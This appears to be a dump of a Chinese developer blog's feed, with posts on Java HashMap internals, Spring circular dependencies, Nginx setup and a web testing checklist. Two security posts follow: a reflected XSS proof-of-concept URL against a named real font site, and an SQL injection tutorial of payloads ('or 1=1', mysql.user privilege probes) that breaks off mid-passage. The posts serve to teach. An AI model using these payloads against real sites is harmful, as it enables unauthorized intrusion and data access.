title="new一个hashmap时会发生什么?"></a>new一个hashmap时会发生什么?</h4><p>HashMap有几个构造方法,但最主要的就是指定初始值以及负载因子的大小.如果不指定,默认hashmap的<strong>大小为16</strong>,<strong>负载因子的大小为0.75</strong>.</p><blockquote><p>HashMap的大小只能是2次幂,（因为只有大小为2次幂时，才能合理用位运算替代取模）</p><p>假如传一个10进去,实际大小是16.</p><p>假如传入一个7进去,hashmap最终大小是8,具体实现在tableSizeFor可以看到</p></blockquote><p>把元素放进hashmap的时候，需要算出这个元素所在的位置（hash），在hashmap里用的是位运算来代替取模，能够更加高效地算出该元素所在的位置。</p><p>而负载因子的大小决定着哈希表的扩容和哈希冲突。</p><p>比如默认hashmap的大小为16,负载因子的大小为0.75.这意味着数组最多只能放16×0.75=12个元素，一旦超过12个元素，则哈希表需要扩容。每次Put元素的时候都会检查hashmap的大小有没有超过这个阈值，如果超过则扩容。</p><p>鉴于（HashMap的大小只能是2次幂），所以扩容的时候默认扩容为原来的2倍。</p><blockquote><p>扩容是耗时的,也可以通过调高负载因子来减少扩容.</p><p>但是一般不推荐这样做,因为这样意味着哈希冲突的概率会增高,哈希冲突的概率增高同样会耗时(因为查找的速度变慢了)</p></blockquote><h4 id="Put元素"><a href="#Put元素" class="headerlink" title="Put元素"></a>Put元素</h4><p>怎么计算hash？</p><blockquote><p>put元素的时候，先算出正常的哈希值，然后与高16位做异或运算，产生最终的哈希值。好处是增加了随机性，减少了碰撞冲突的可能性。</p></blockquote><p>put和get的实现</p><h4 id="put"><a href="#put" class="headerlink" title="put"></a>put</h4><blockquote><p>首先对key做hash运算，计算出该key所在的index。</p><p>如果没碰撞，直接放到数组中，如果碰撞了，需要判断目前数据结构是链表还是红黑树，根据不同的情况来进行插入。</p><p>假如key相同的，则替换到原来的值。最后判断哈希表是否满了（当前哈希表大小×负载因子），如果满了，则扩容。</p></blockquote><h4 id="get"><a href="#get" class="headerlink" title="get"></a>get</h4><blockquote><p>还是对key做hash运算，计算出该key所在的index，然后判断是否有哈希冲突。</p><p>假如没有冲突则直接返回。假设有冲突则判断目前数据结构是链表还是红黑树，分别从不同的数据结构中取出。 </p></blockquote><h4 id="在hashmap中，怎么判断一个元素是否相同？"><a href="#在hashmap中，怎么判断一个元素是否相同？" class="headerlink" title="在hashmap中，怎么判断一个元素是否相同？"></a>在hashmap中，怎么判断一个元素是否相同？</h4><p>首先比较hash值，随后会用==运算符和equals()来判断该元素是否相同。</p><p>说白了，就是：</p><p>如果只有hash值相同，那说明该元素hash冲突了，如果hash值和equal() || == 都相同，那说明该元素是同一个。</p><h4 id="什么情况下会转红黑树？"><a href="#什么情况下会转红黑树？" class="headerlink" title="什么情况下会转红黑树？"></a>什么情况下会转红黑树？</h4><blockquote><p>当数组大小&gt;64且链表的大小&gt;8的时候才会将链表转为红黑树。当红黑树大小为6时，会退化为链表。</p><p>这里转红黑树退化为链表的操作主要出于查询和插入时对性能的考量</p><p>链表的查询时间复杂度为O(N),插入时间复杂度为O(1),红黑树查询和插入时间复杂度为O(logN)</p></blockquote><h4 id="线程安全？"><a href="#线程安全？" class="headerlink" title="线程安全？"></a>线程安全？</h4><blockquote><p>HashMap是线程不安全的，在多线程环境下，HashMap有可能会有数据丢失和获取不了最新数据的问题，比如线程A put进去了，线程B get不出来。</p></blockquote><h2 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h2><blockquote><p>实际上继承了HashMap，在HashMap的基础上维护了一个双向链表。</p><p>有了这个双向链表，插入的顺序是有序的。</p><p>LinkedHashMap在遍历的时候，实际上是用的是双向链表来遍历的，所以LinkedHashMap的大小不会影响到遍历的性能</p></blockquote><h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><blockquote><p>TreeMap的key不能为null（如果为null就不能排序），TreeMap有序是通过Comparator来进行比较的，如果</p><p>Comparator为null，那么就使用自然顺序</p></blockquote><h2 id="ConcurrentHashMap"><a href="#ConcurrentHashMap" class="headerlink" title="ConcurrentHashMap"></a>ConcurrentHashMap</h2><blockquote><p>ConcurrentHashMap是JUC包下的线程安全的Map实现类，他能支持高并发的访问和更新。</p><p>线程安全的Map实现类还有HashTable，还有可以使用Collections来包装出一个线程安全的Map。</p><p>但是HashTable还是Collections来包装出来的，都比较低效，因为都是直接在外层套synchronize。</p><p>所以一般有线程安全问题考量的，都使用ConcurrentHashMap。</p></blockquote><p>ConcurrentHashMap通过在部分加锁和利用CAS算法来实现同步，在get的时候没有加锁，Node都用了volatile给修饰。</p><p>在扩容时，会给每个线程分配对应的区间，并且为了防止putVal导致数据不一致，会给线程的所负责的区间加锁。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;深入浅出Map&quot;&gt;&lt;a href=&quot;#深入浅出Map&quot; class=&quot;headerlink&quot; title=&quot;深入浅出Map&quot;&gt;&lt;/a&gt;深入浅出Map&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Map是java里边是一个接口,常见的实现类有HashMap、Linked
      
    
    </summary>
    
    
    
      <category term="algorithm" scheme="https://kayleh.top/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Spring Cyclic Ependencies</title>
    <link href="https://kayleh.top/Spring-cyclic-ependencies/"/>
    <id>https://kayleh.top/Spring-cyclic-ependencies/</id>
    <published>2021-04-16T07:36:37.000Z</published>
    <updated>2021-04-16T16:00:21.003Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Spring是怎么解决循环依赖的？"><a href="#Spring是怎么解决循环依赖的？" class="headerlink" title="Spring是怎么解决循环依赖的？"></a>Spring是怎么解决循环依赖的？</h2><p>首先站在Spring整个Framework体系而言的话，Spring的Bean是由一个BeanDefinition来的，就是在Spring当中，有一个叫建模的类BeanDefinition，Spring的Bean有一系列比较复杂的生命周期：</p><ul><li><p>首先，Spring容器启动。</p></li><li><p>spring进行扫描</p></li><li>反射后封装成beanDefinition对象，放入beanDefinitionMap</li><li>遍历map</li><li>验证（是否单例、是否延迟加载、是否抽象）</li><li>推断构造方法（ 把当前这个Spring Bean所代表的类当中的构造方法得到一个最佳的一个构造方法 ）</li><li>准备开始进行实例</li><li>去单例池中查，没有——》去二级缓存中找，没有提前暴露——》生成一个objectFactory对象暴露到二级缓存中——》属性注入，发现依赖Y——》此时Y开始它的生命周期直到属性注入，发现依赖X-&gt;X又走一遍生命周期，当走到去二级缓存中找的时候找到了-&gt;往Y中注入X的objectFactory对象-&gt;完成循环依赖。</li></ul><p>1、为什么要使用X的objectFacory对象而不是直接使用X对象？</p><blockquote><p>利于拓展，程序员可以通过beanPostProcess接口操作objectFactory对象生成自己想要的对象</p></blockquote><p>2、是不是只能支持单例(scope=singleton)而不支持原型(scope=prototype)？</p><blockquote><p>是。因为单例是spring在启动时进行bean加载放入单例池中，在依赖的bean开始生命周期后，可以直接从二级缓存中取到它所依赖的bean的objectFactory对象从而结束循环依赖。而原型只有在用到时才会走生命周期流程，但是原型不存在一个已经实例化好的bean，所以会无限的创建-&gt;依赖-&gt;创建-&gt;依赖-&gt;…。</p></blockquote><p>3、循环依赖是不是只支持非构造方法？</p><blockquote><p>是。类似死锁问题 </p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Spring是怎么解决循环依赖的？&quot;&gt;&lt;a href=&quot;#Spring是怎么解决循环依赖的？&quot; class=&quot;headerlink&quot; title=&quot;Spring是怎么解决循环依赖的？&quot;&gt;&lt;/a&gt;Spring是怎么解决循环依赖的？&lt;/h2&gt;&lt;p&gt;首先站在Spring
      
    
    </summary>
    
    
    
      <category term="frame" scheme="https://kayleh.top/tags/frame/"/>
    
  </entry>
  
  <entry>
    <title>Head First Nginx</title>
    <link href="https://kayleh.top/Head-First-nginx/"/>
    <id>https://kayleh.top/Head-First-nginx/</id>
    <published>2021-04-14T21:55:17.000Z</published>
    <updated>2021-04-15T15:12:41.680Z</updated>
    
    <content type="html"><![CDATA[<h2 id="公司产品出现瓶颈？"><a href="#公司产品出现瓶颈？" class="headerlink" title="公司产品出现瓶颈？"></a>公司产品出现瓶颈？</h2><p>我们公司项目刚刚上线的时候，并发量小，用户使用的少，所以在低并发的情况下，一个jar包启动应用就够了，然后内部tomcat返回内容给用户。<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy98b25257-71be-48f3-8afe-e1226ebc4589.png" alt="img"><br>但是慢慢的，使用我们平台的用户越来越多了，并发量慢慢增大了，这时候一台服务器满足不了我们的需求了。<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy1d77bc35-df30-46fb-8c41-61ff4468d0c9.png" alt="img"><br>于是我们横向扩展，又增加了服务器。这个时候几个项目启动在不同的服务器上，用户要访问，就需要增加一个代理服务器了，通过代理服务器来帮我们转发和处理请求。<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy33ee7313-9356-46e6-a0b2-fc1ed8ef9a62.png" alt="img"><br>我们希望这个代理服务器可以帮助我们接收用户的请求，然后将用户的请求按照规则帮我们转发到不同的服务器节点之上。这个过程用户是无感知的，用户并不知道是哪个服务器返回的结果，我们还希望他可以按照服务器的性能提供不同的权重选择。保证最佳体验！所以我们使用了Nginx。</p><h2 id="什么是Nginx？"><a href="#什么是Nginx？" class="headerlink" title="什么是Nginx？"></a>什么是Nginx？</h2><p>Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为俄罗斯访问量第二的Rambler.ru站点（俄文：Рамблер）开发的，第一个公开版本0.1.0发布于2004年10月4日。2011年6月1日，nginx 1.0.4发布。</p><p>其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好，中国大陆使用nginx网站用户有：百度、京东、新浪、网易、腾讯、淘宝等。在全球活跃的网站中有12.18%的使用比率，大约为2220万个网站。</p><p>Nginx 是一个安装非常的简单、配置文件非常简洁（还能够支持perl语法）、Bug非常少的服务。Nginx 启动特别容易，并且几乎可以做到7*24不间断运行，即使运行数个月也不需要重新启动。你还能够不间断服务的情况下进行软件版本的升级。</p><p>Nginx代码完全用C语言从头写成。官方数据测试表明能够支持高达 50,000 个并发连接数的响应。</p><h2 id="Nginx作用？"><a href="#Nginx作用？" class="headerlink" title="Nginx作用？"></a>Nginx作用？</h2><blockquote><p>Http代理，反向代理：作为web服务器最常用的功能之一，尤其是反向代理。</p></blockquote><p>正向代理<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy46bdad36-d3e0-43b0-a223-43360b7e8fc7.png" alt="img"><br>反向代理<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy62a15097-6e2a-4dbe-bcf5-f0d7cab81089.png" alt="img"></p><blockquote><p> Nginx提供的负载均衡策略有2种：内置策略和扩展策略。内置策略为轮询，加权轮询，Ip hash。扩展策略，就天马行空，只有你想不到的没有他做不到的。</p></blockquote><p>轮询<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy4d33dfac-1949-4b2d-abb8-fe0b6e65b8dc.png" alt="img"><br>加权轮询<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyb1e3e440-4159-4259-a174-528b56cb04b2.png" alt="img"><br>iphash对客户端请求的ip进行hash操作，然后根据hash结果将同一个客户端ip的请求分发给同一台服务器进行处理，可以解决session不共享的问题。<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy64acb9a3-cd1a-4c0e-a1fa-9b220046a95a.png" alt="img"></p><blockquote><p>动静分离，在我们的软件开发中，有些请求是需要后台处理的，有些请求是不需要经过后台处理的（如：css、html、jpg、js等等文件），这些不需要经过后台处理的文件称为静态文件。让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作。提高资源响应的速度。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyedb1bbd6-e530-4aba-8fde-68658a10e73f.png" alt="img"></p><p>目前，通过使用Nginx大大提高了我们网站的响应速度，优化了用户体验，让网站的健壮性更上一层楼！</p><h1 id="Nginx的安装"><a href="#Nginx的安装" class="headerlink" title="Nginx的安装"></a>Nginx的安装</h1><h2 id="windows下安装"><a href="#windows下安装" class="headerlink" title="windows下安装"></a>windows下安装</h2><p><strong>1、下载nginx</strong></p><p><a href="http://nginx.org/en/download.html" target="_blank" rel="noopener">http://nginx.org/en/download.html</a> 下载稳定版本。<br>以nginx/Windows-1.16.1为例，直接下载 nginx-1.16.1.zip。<br>下载后解压，解压后如下：</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyb5a1d538-352c-4aa6-88f7-23d18f0588ab.png" alt="img"></p><p><strong>2、启动nginx</strong></p><p>有很多种方法启动nginx</p><p>(1)直接双击nginx.exe，双击后一个黑色的弹窗一闪而过</p><p>(2)打开cmd命令窗口，切换到nginx解压目录下，输入命令 <code>nginx.exe</code> ，回车即可</p><p><strong>3、检查nginx是否启动成功</strong></p><p>直接在浏览器地址栏输入网址 <a href="http://localhost/" target="_blank" rel="noopener">http://localhost:80</a> 回车，出现以下页面说明启动成功！</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudya21688c8-159e-4caa-8e65-3dc056b6b78e.png" alt="img"></p><p><strong>4、配置监听</strong></p><p>nginx的配置文件是conf目录下的nginx.conf，默认配置的nginx监听的端口为80，如果80端口被占用可以修改为未被占用的端口即可。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyf23105c4-b0b2-4e22-a1bf-b8098f40c144.png" alt="img"></p><p>当我们修改了nginx的配置文件nginx.conf 时，不需要关闭nginx后重新启动nginx，只需要执行命令 <code>nginx -s reload</code> 即可让改动生效</p><p><strong>5、关闭nginx</strong></p><p>如果使用cmd命令窗口启动nginx， 关闭cmd窗口是不能结束nginx进程的，可使用两种方法关闭nginx</p><p>(1)输入nginx命令 <code>nginx -s stop</code>(快速停止nginx) 或 <code>nginx -s quit</code>(完整有序的停止nginx)</p><p>(2)使用taskkill <code>taskkill /f /t /im nginx.exe</code></p><pre><code>taskkill是用来终止进程的，/f是强制终止 ./t终止指定的进程和任何由此启动的子进程。/im示指定的进程名称 .</code></pre><h2 id="linux下安装"><a href="#linux下安装" class="headerlink" title="linux下安装"></a>linux下安装</h2><p><strong>1、安装gcc</strong></p><p>安装 nginx 需要先将官网下载的源码进行编译，编译依赖 gcc 环境，如果没有 gcc 环境，则需要安装：</p><pre><code>yum install gcc-c++</code></pre><p><strong>2、PCRE pcre-devel 安装</strong></p><p>PCRE(Perl Compatible Regular Expressions) 是一个Perl库，包括 perl 兼容的正则表达式库。nginx 的 http 模块使用 pcre 来解析正则表达式，所以需要在 linux 上安装 pcre 库，pcre-devel 是使用 pcre 开发的一个二次开发库。nginx也需要此库。命令：</p><pre><code>yum install -y pcre pcre-devel</code></pre><p><strong>3、zlib 安装</strong></p><p>zlib 库提供了很多种压缩和解压缩的方式， nginx 使用 zlib 对 http 包的内容进行 gzip ，所以需要在 Centos 上安装 zlib 库。</p><pre><code>yum install -y zlib zlib-devel</code></pre><p><strong>4、OpenSSL 安装</strong><br>OpenSSL 是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及 SSL 协议，并提供丰富的应用程序供测试或其它目的使用。<br>nginx 不仅支持 http 协议，还支持 https（即在ssl协议上传输http），所以需要在 Centos 安装 OpenSSL 库。</p><pre><code>yum install -y openssl openssl-devel</code></pre><p><strong>5、下载安装包</strong></p><p>手动下载.tar.gz安装包，地址：<a href="https://nginx.org/en/download.html" target="_blank" rel="noopener">https://nginx.org/en/download.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyf51b946d-fda4-4675-b913-2084e028a5c0.png" alt="img"></p><p>下载完毕上传到服务器上 /root</p><p><strong>6、解压</strong></p><pre><code>tar -zxvf nginx-1.18.0.tar.gzcd nginx-1.18.0</code></pre><p><strong>7、配置</strong></p><p>使用默认配置，在nginx根目录下执行</p><p>​        1、./configure 是用来检测你的安装平台的目标特征的。比如它会检测你是不是有CC或GCC，并不是需要CC或GCC，它是个shell脚本。</p><p>　　2、make 是用来编译的，它从Makefile中读取指令，然后编译。</p><p>　　3、make install是用来安装的，它也从Makefile中读取指令，安装到指定的位置。</p><p>　　注意：AUTOMAKE和AUTOCONF是非常有用的用来发布C程序的东西。</p><pre class="line-numbers language-lang-shell"><code class="language-lang-shell">./configuremakemake install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查找安装路径： <code>whereis nginx</code></p><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyf80f8dc2-d5df-4bc2-933d-6ce11f388f6e.png" alt="img"> </p><h2 id="Nginx常用命令"><a href="#Nginx常用命令" class="headerlink" title="Nginx常用命令"></a>Nginx常用命令</h2><pre class="line-numbers language-lang-cmd"><code class="language-lang-cmd">cd /usr/local/nginx/sbin/./nginx  启动./nginx -s stop  停止./nginx -s quit  安全退出./nginx -s reload  重新加载配置文件ps aux|grep nginx  查看nginx进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>启动成功访问 服务器ip:80</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyd64b251b-817c-436b-b7a0-57da7bb48cd1.png" alt="img"></p><p>注意：如何连接不上，检查阿里云安全组是否开放端口，或者服务器防火墙是否开放端口！<br>相关命令：</p><pre class="line-numbers language-lang-cmd"><code class="language-lang-cmd"># 开启service firewalld start# 重启service firewalld restart# 关闭service firewalld stop# 查看防火墙规则firewall-cmd --list-all# 查询端口是否开放firewall-cmd --query-port=8080/tcp# 开放80端口firewall-cmd --permanent --add-port=80/tcp# 移除端口firewall-cmd --permanent --remove-port=8080/tcp#重启防火墙(修改配置后要重启防火墙)firewall-cmd --reload# 参数解释1、firwall-cmd：是Linux提供的操作firewall的一个工具；2、--permanent：表示设置为持久；3、--add-port：标识添加的端口；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h1><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/nginx.png" alt="nginx"></p><pre class="line-numbers language-lang-cmd"><code class="language-lang-cmd">upstream lb{    server 127.0.0.1:8080 weight=1;    server 127.0.0.1:8081 weight=1;}location / {    proxy_pass http://lb;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;公司产品出现瓶颈？&quot;&gt;&lt;a href=&quot;#公司产品出现瓶颈？&quot; class=&quot;headerlink&quot; title=&quot;公司产品出现瓶颈？&quot;&gt;&lt;/a&gt;公司产品出现瓶颈？&lt;/h2&gt;&lt;p&gt;我们公司项目刚刚上线的时候，并发量小，用户使用的少，所以在低并发的情况下，一个jar
      
    
    </summary>
    
    
    
      <category term="middleware" scheme="https://kayleh.top/tags/middleware/"/>
    
  </entry>
  
  <entry>
    <title>Web Test Combat</title>
    <link href="https://kayleh.top/web-test-combat/"/>
    <id>https://kayleh.top/web-test-combat/</id>
    <published>2021-04-13T08:50:01.000Z</published>
    <updated>2021-04-14T11:05:35.806Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web测试要点"><a href="#Web测试要点" class="headerlink" title="Web测试要点"></a>Web测试要点</h2><ul><li><p>功能测试  -(最基本)</p><ul><li><p>链接测试</p><p>1.所有链接是否链接到该链接的页面</p><p>2.页面是否存在</p><p>3.不存在孤立页面</p></li><li><p>表单测试</p><p>1提交数据——&gt;注册(数据库 新增), 修改订单(数据库 改)</p><h5 id="常用控件-输入框-下拉框-上传文件-图片-Excel-txt等-提交按钮-单选多选"><a href="#常用控件-输入框-下拉框-上传文件-图片-Excel-txt等-提交按钮-单选多选" class="headerlink" title="常用控件:输入框,下拉框,上传文件(图片,Excel,txt等),提交按钮,单选多选"></a>常用控件:输入框,下拉框,上传文件(图片,Excel,txt等),提交按钮,单选多选</h5><ul><li>输入框:长度,数据类型,必填,重复   空格和业务约束</li><li>下拉框:默认信息,数据完整性/正确性,第一条最后一条</li><li>上传文件(图片,Excel,txt等):大小,格式,尺寸,数量等. 文件本身的内容规则验证</li><li>提交按钮:支持回车/单击;弱网测试 ,快速点击是否重复提交,提交内容是否涉及加密</li></ul></li><li><p>搜索测试</p><ul><li><p>输入框(按时间搜索),下拉框</p></li><li><p>假设:搜索条件A,B,C,D</p></li><li><p>任单个条件查询:下拉框,输入框(模糊搜索,超长搜索,不存在条件,为空)</p></li><li><p>时间搜索</p><p>开始时间,结束时间</p><p>开始时间=结束时间 ( 同一天数据)</p><p>开始时间&lt;结束时间(造跨年 跨天 跨月的数据)</p><p>开始时间&gt;结束时间(异常)</p><p>手动输入,格式</p></li></ul></li><li><p>删除测试</p><ul><li>没有数据,删除</li><li>选择一条数据/批量选择/全选,删除.   删除二次确认.且删除后合理提示</li><li>删除数据关联性</li><li>数据库角度,删,确认数据库是否及时更新</li></ul></li><li><p>cookie,session测试</p><ul><li>存储用户信息的,记录用户身份给予后续操作通行证</li><li>确认浏览器存储cookie目录有无cookie相关信息</li><li>保存时间之外,cookie是否正常</li><li>删除浏览器所有的cookie文件,再次登录,会怎么处理</li><li>鉴权</li></ul></li><li><p>数据库测试</p><ul><li>搭建测试环境,初始化sql脚本</li></ul></li></ul></li><li><p>界面/可用性测试</p><ul><li>是否跟产品原型/ui效果图一致</li><li>功能测试同步测试</li></ul></li><li><p>兼容性测试</p><ul><li>主要考虑浏览器</li><li>主流浏览器+内核(ie,firefox,Chrome,opera)</li><li>浏览器测试工具IEtest</li><li>功能测试同步关注</li></ul></li><li><p>接口测试</p><ul><li>确保后端代码的功能实现</li><li>jmeter</li></ul></li><li><p>安全测试</p><ul><li>sql注入，跨站攻击</li><li>漏洞扫描appscan </li></ul></li><li><p>性能测试</p><ul><li>jmeter/loadrunner</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Web测试要点&quot;&gt;&lt;a href=&quot;#Web测试要点&quot; class=&quot;headerlink&quot; title=&quot;Web测试要点&quot;&gt;&lt;/a&gt;Web测试要点&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;功能测试  -(最基本)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;链接测试&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>Reflected XSS Vulnerability in Font Download Website</title>
    <link href="https://kayleh.top/Reflected-XSS-Vulnerability-in-Font-Download-Website/"/>
    <id>https://kayleh.top/Reflected-XSS-Vulnerability-in-Font-Download-Website/</id>
    <published>2021-04-10T10:26:29.000Z</published>
    <updated>2021-04-15T15:11:27.382Z</updated>
    
    <content type="html"><![CDATA[<h2 id="字体下载网站的反射XSS漏洞"><a href="#字体下载网站的反射XSS漏洞" class="headerlink" title="字体下载网站的反射XSS漏洞"></a>字体下载网站的反射XSS漏洞</h2><blockquote><p>URL:<a href="http://www.ztxz.org" target="_blank" rel="noopener">http://www.ztxz.org</a></p></blockquote><p>搜索框输入：</p><pre class="line-numbers language-lang-js"><code class="language-lang-js"><script>alert(1)</script><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会出现弹窗，证明反射XSS的存在。</p><blockquote><p><a href="http://www.ztxz.org/search/?key=%3Cscript%3Ealert(1)%3C/script%3E" target="_blank" rel="noopener">http://www.ztxz.org/search/?key=%3Cscript%3Ealert(1)%3C/script%3E</a></p></blockquote><p>用户在请求某条URL地址的时候，会携带一部分数据。当客户端进行访问某条链接时，攻击者可以将恶意代码植入到URL，如果服务端未对URL携带的参数做判断或者过滤处理，直接返回响应页面，那么XSS攻击代码就会一起被传输到用户的浏览器，从而触发反射型XSS。例如，当用户进行搜索时，返回结果通常会包括用户原始的搜索内容，如果攻击者精心构造包含XSS恶意代码的链接，诱导用户点击并成功执行后，用户的信息就可以被窃取，甚至可以模拟用户进行一些操作。它的利用过程如图所示。</p><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Reflected-XSS-Vulnerability-in-Font-Download-Website/20190522105651307.png" alt="在这里插入图片描述"> </p><p>反射型XSS不会永久存储用户的数据，仅发生在用户的一次访问过程之后。这个过程就像一次反射，因此得名反射型XSS。反射型XSS的触发条件比较苛刻，需要攻击者想方设法引导用户点击链接，但产生的危害不容忽视。</p><p>参考资料：<a href="https://www.bugbank.cn/q/article/598438535ecec4fe1c216740.html" target="_blank" rel="noopener">https://www.bugbank.cn/q/article/598438535ecec4fe1c216740.html</a></p><p> <a href="http://blog.csdn.net/binyao02123202/article/details/9041113" target="_blank" rel="noopener">http://blog.csdn.net/binyao02123202/article/details/9041113</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;字体下载网站的反射XSS漏洞&quot;&gt;&lt;a href=&quot;#字体下载网站的反射XSS漏洞&quot; class=&quot;headerlink&quot; title=&quot;字体下载网站的反射XSS漏洞&quot;&gt;&lt;/a&gt;字体下载网站的反射XSS漏洞&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;URL:&lt;a hr
      
    
    </summary>
    
    
    
      <category term="security" scheme="https://kayleh.top/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>SQL injection</title>
    <link href="https://kayleh.top/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://kayleh.top/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-05T17:48:59.000Z</published>
    <updated>2021-04-15T15:08:14.772Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><blockquote><p><a href="https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html" target="_blank" rel="noopener">https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html</a></p></blockquote><h2 id="常见的几种SQL注入"><a href="#常见的几种SQL注入" class="headerlink" title="常见的几种SQL注入"></a>常见的几种SQL注入</h2><blockquote><p>1.数字型<br>2.字符型<br>3.文本型<br>4.搜索型(POST/GET)<br>5.cookie注入<br>6.SQL盲注<br>7.编码注入<br>8.宽字节注入</p></blockquote><h2 id="MySQL报错注入基本流程"><a href="#MySQL报错注入基本流程" class="headerlink" title="MySQL报错注入基本流程"></a>MySQL报错注入基本流程</h2><blockquote><p>1.判断sql注入<br>2.数据库权限判断<br>3.判断字段数<br>4.查询库名<br>5.查表名<br>6.查字段<br>7.查数据</p></blockquote><h3 id="1-数字型"><a href="#1-数字型" class="headerlink" title="1.数字型"></a>1.数字型</h3><p>1.判断sql注入</p><ul><li><p>提交单引号</p><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">http://localhost/sqls/index.php?id=2'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>and大法和or大法</p><p>在参数后面加上<code>and 1 = 1</code></p><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">http://localhost/sqls/index.php?id=2 and 1 = 1     //可以查询http://localhost/sqls/index.php?id=2 and 1 = 2       //查询错误<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 可以发现and 1=1 返回了数据，而and 1=2没有，这是由于1=1是一个为真的条件，前面的结果是true，true and true 所以没有任何问题，第二个 1=2 是个假条件， true and false还是false，所以并没有数据返回。</p><p> 接下来看下or、or就是或者，两个都为假，才会为假，只要一个为真就为真，把语句后面的id改成一个不存在的，后面接上or 1=1，这样的话就成了 false or true，结果为true。 </p><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">http://localhost/sqls/index.php?id=5 or 1 = 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>加法和减法</p><p>加法和减法的使用要区别是数字型还是字符型的注入、然后来区分了、可以看他后面的参数如果是数字、就一定是数字型、如果是一些字母的话就是字符型注入。</p><pre><code>select * from user where id=4  //数字型注入 sql 语句select * from user where username=’fendo’ //字符型注入 sql 语句</code></pre><ul><li><p>加法</p><p> 我们在参数输入1+1，看看返回的数据是不是id等于2的结果，这里注意一下+号在SQL语句是有特效含义的，所以我们要对其进行url编码，最后也就是%2b。 </p><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">select * from user where id=1+1 //第二条数据<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>减法</p><p>减法是同样的道理，不过不需要对-号进行url编码了</p><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">select * from user where id=2-1 //第一条数据<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>数据库权限判断</p><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">and ord(mid(user(),1,1))=114解释:判断ROOT权限 返回正确存在 ----------------------------------或 and (select count(*) from mysql.user)>0解释:and (select count(*) from mysql.user)>0   /* 如果结果返回正常,说明具有读写权限。and (select count(*) from mysql.user)>0   /* 返回错误，应该是管理员给数据库帐户降权了。<span aria-hidden="true" 